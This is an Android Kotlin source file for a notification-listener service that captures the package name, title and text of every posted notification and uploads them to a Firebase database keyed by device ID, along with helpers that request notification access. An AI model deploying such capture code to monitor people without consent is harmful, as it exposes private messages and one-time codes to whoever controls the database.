package com.abuzahra.app.service

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Settings
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.abuzahra.app.utils.DeviceInfo
import com.google.firebase.database.FirebaseDatabase

class NotificationListener : NotificationListenerService() {

    private val TAG = "NotificationListener"

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        try {
            val deviceId = DeviceInfo.getDeviceId(this)
            val packageName = sbn?.packageName ?: "unknown"
            val title = sbn?.notification?.extras?.getCharSequence("android.title")?.toString() ?: ""
            val text = sbn?.notification?.extras?.getCharSequence("android.text")?.toString() ?: ""
            val key = sbn?.key ?: ""

            val notification = mapOf(
                "packageName" to packageName,
                "title" to title,
                "text" to text,
                "timestamp" to System.currentTimeMillis(),
                "key" to key
            )

            // Store in Firebase
            val db = FirebaseDatabase.getInstance()
            db.reference.child("devices").child(deviceId).child("notifications").child(System.currentTimeMillis().toString())
                .setValue(notification)

            Log.d(TAG, "Notification captured: $packageName - $title")
        } catch (e: Exception) {
            Log.e(TAG, "Error capturing notification", e)
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        super.onNotificationRemoved(sbn)
    }

    companion object {
        fun isNotificationAccessEnabled(context: Context): Boolean {
            val flat = Settings.Secure.getString(context.contentResolver, "enabled_notification_listeners")
            val cn = ComponentName(context, NotificationListener::class.java).flattenToString()
            return flat != null && flat.contains(cn)
        }

        fun requestNotificationAccess(context: Context) {
            try {
                val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(intent)
            } catch (e: Exception) {
                try {
                    val intent = Intent(Settings.ACTION_SETTINGS)
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    context.startActivity(intent)
                } catch (_: Exception) {}
            }
        }
    }
}
